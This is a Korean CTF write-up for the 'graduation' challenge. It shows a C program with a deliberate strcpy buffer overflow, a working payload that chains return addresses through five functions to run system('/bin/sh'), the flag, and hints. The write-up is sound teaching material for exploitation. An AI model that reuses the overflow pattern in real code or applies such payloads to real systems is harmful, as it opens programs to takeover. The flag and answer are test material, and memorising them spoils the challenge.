# graduation - ??pt

## 문제

우리는 입학부터 졸업까지 여러가지 역경에 휘말립니다. 모든 역경을 뚫고 졸업에 성공합시다 여러분!



## 문제 취지

힌트와 같다.



## 풀이 방법

코드는 다음과 같다. 

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check = 0;
char usethis[8] = "/bin/sh";

void graduation(char *cmd)
{
        if(check != 4){
                printf("Nah...\n");
                exit(0);
        }

        printf("졸업을 축하드립니다!!!\n");

        // Use this!
        system(cmd);
}

void senior(void)
{
        if(check != 3){
                printf("Nah...\n");
                exit(0);
        }

        printf("곧.... 졸업...\n");
        check = 4;
}

void junior(void)
{
        if(check != 2){
                printf("Nah...\n");
                exit(0);
        }

        printf("벌써 3학년이구먼...\n");
        check = 3;
}

void sophomore(void)
{
        if(check != 1){
                printf("Nah...\n");
                exit(0);
        }

        printf("이제 2학년이네.. 정신차리고 공부해야지..\n");
        check = 2;
}

void freshman(void)
{
        printf("와! 1학년! 와!\n");
        check = 1;
}
void main(int argc, char *argv[])
{
        char buffer[40];
        char* addr;

        if(argc < 2){
                printf("argv error\n");
                exit(0);
        }
        printf("%p\n", usethis);
        
        // check address
        addr = (char *)&freshman;
        if (memcmp(argv[1] + 52, &addr, 4) != 0){
                printf("입학은 하셔야죠?\n");
                exit(0);
        }

		//do not give to solver
        addr = (char *)&system;
        for (int i = 0; i < 100; i++) {
                if (memcmp(argv[1] + 52 + (i * 4), &addr, 4) == 0) {
                        printf("No hack ~.~\n");
                        exit(0);
            	}
        }
        

        // overflow!
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
}

```

코드를 통해 strcpy에서 버퍼오버플로우 공격을 사용해야 한다는 것을 알 수 있고, check 변수가 4가 된 후에 모든 함수를 실행시켜 가장 나중엔 graduation함수를 이용해 `system("/bin/sh\x00")`을 실행시켜야 함을 알 수 있다. 

`check address`와  `do not give to solver`부분에 의해 의도 된 대로 code를 체이닝 해서 풀어야만 이 문제를 풀 수 있다.

먼저 실행시켜보면, argv error가 발생하면서 Segmentation fault가 뜬다. 인자를 아무거나 넣고 실행해보면, usethis의 주소인 0x804c030(다르게 나올 수 있음)이 나오고 실패 문구가 나온다. 힌트를 통해 코드를 연속적으로 호출해야 한다는 힌트를 얻고,

![image](https://user-images.githubusercontent.com/40850499/66598320-c101da00-ebdb-11e9-9673-f1ac5ca2b3fd.png)

objdump -d 명령을 통해 각 함수의 주소를 구할 수 있다. 따라서 다음과 같이 페이로드를 구할 수 있다.

./graduation \`python -c 'print "A"*48 + "\xef\x92\x04\x08" + "\xa0\x92\x04\x08" + "\x51\x92\x04\x08" + "\x02\x92\x04\x08" + "\xb2\x91\x04\x08" + "AAAA" + "\x30\xc0\x04\x08"'\`

![image](https://user-images.githubusercontent.com/40850499/66678066-0559ac80-eca6-11e9-8357-56f230a43cc6.png)



## Flag

scpCTF{I_w4nt_t0_st4y_in_5tud3n7_lif3_4ever}



## 힌트

1. RET를 코드영역의 주소로 덮어씌울 수 있나요? 각 코드의 주소는 objdump 명령어를 통해 확인할 수 있다고 합니다!
2. RET를 덮는 BOF 공격을 연속적으로 할 수 있나요?
3. x86 아키텍쳐에서 함수의 인자 값이 전달 되는 원리를 알고 계신가요? [유용한 링크](<https://en.wikipedia.org/wiki/X86_calling_conventions#cdecl>)



(의도된 풀이로 풀리게끔 소스코드와는 실제로 다르게 코딩 된 부분이 있습니다.)